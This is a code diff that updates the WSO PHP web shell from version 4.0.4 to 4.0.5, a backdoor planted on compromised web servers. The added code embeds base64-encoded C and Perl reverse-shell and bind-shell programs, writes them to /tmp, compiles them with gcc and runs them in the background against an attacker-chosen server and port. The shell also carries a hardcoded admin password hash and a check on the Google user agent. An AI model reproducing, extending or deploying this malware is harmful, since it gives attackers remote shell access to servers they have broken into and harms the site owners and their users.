@@ -1,5 +1,5 @@
 <?php
-/* WSO 4.0.4 (Web Shell by HARD _LINUX) */
+/* WSO 4.0.5 (Web Shell by HARD _LINUX) */
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#fff";
 $default_action = 'FilesMan';
@@ -15,7 +15,7 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.0.4');
+@define('VERSION', '4.0.5');
 if( get_magic_quotes_gpc() ) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -249,8 +249,8 @@ function ex($in) {
 		while(!@feof($f))
 			$out .= fread($f,1024);
 		pclose($f);
-	}else return '↳ Unable to execute command';
-	return ($out==''?'↳ Query did not return anything':$out);
+	}else return "↳ Unable to execute command\n";
+	return ($out==''?"↳ Query did not return anything\n":$out);
 }
 function viewSize($s) {
 	if($s >= 1073741824)
@@ -1494,38 +1494,50 @@ function actionSql() {
 // Network go --------------------
 function actionNetwork() {
 	printHeader();
+	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
 	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+	$bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
 	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
 	echo "<h1>Network tools</h1><div class=content>
-	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
-	<span>Bind port to /bin/sh [perl]</span><br/>
-	Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+	<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>
+	<span>Bind port to /bin/sh</span><br/>
+	Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select> <input type=submit value='>>'>
 	</form>
-	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
-	<span>Back-connect  [perl]</span><br/>
-	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+	<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>
+	<span>Back-connect to</span><br/>
+	Server: <input type='text' name='server' value=". $_SERVER['REMOTE_ADDR'] ."> Port: <input type='text' name='port' value='31337'> Using: <select name='using'><option value='bcc'>C</option><option value='bcp'>Perl</option></select> <input type=submit value='>>'>
 	</form><br>";
 	if(isset($_POST['p1'])) {
 		function cf($f,$t) {
-			$w = @fopen($f,"w") or @function_exists('file_put_contents');
-			if($w){
-				@fwrite($w,@base64_decode($t));
+			$w=@fopen($f,"w") or @function_exists('file_put_contents');
+			if($w)	{
+				@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
 				@fclose($w);
 			}
 		}
+		if($_POST['p1'] == 'bpc') {
+			cf("/tmp/bp.c",$bind_port_c);
+			$out = ex("gcc -o /tmp/bp /tmp/bp.c");
+			@unlink("/tmp/bp.c");
+			$out .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$out".ex("ps aux | grep bp")."</pre>";
+		}
 		if($_POST['p1'] == 'bpp') {
 			cf("/tmp/bp.pl",$bind_port_p);
-			$out = ex("perl /tmp/bp.pl ".$_POST['p2']." 1>/dev/null 2>&1 &");
-            sleep(1);
-			echo "<pre class=ml1>$outn".ex("ps aux | grep bp.pl")."</pre>";
-            unlink("/tmp/bp.pl");
+			$out = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
+			echo "<pre class=ml1>$out".ex("ps aux | grep bp.pl")."</pre>";
+		}
+		if($_POST['p1'] == 'bcc') {
+			cf("/tmp/bc.c",$back_connect_c);
+			$out = ex("gcc -o /tmp/bc /tmp/bc.c");
+			@unlink("/tmp/bc.c");
+			$out .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$out".ex("ps aux | grep bc")."</pre>";
 		}
 		if($_POST['p1'] == 'bcp') {
 			cf("/tmp/bc.pl",$back_connect_p);
-			$out = ex("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
-            sleep(1);
-			echo "<pre class=ml1>$outn".ex("ps aux | grep bc.pl")."</pre>";
-            unlink("/tmp/bc.pl");
+			$out = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
+			echo "<pre class=ml1>$out".ex("ps aux | grep bc.pl")."</pre>";
 		}
 	}
 	echo '</div>';
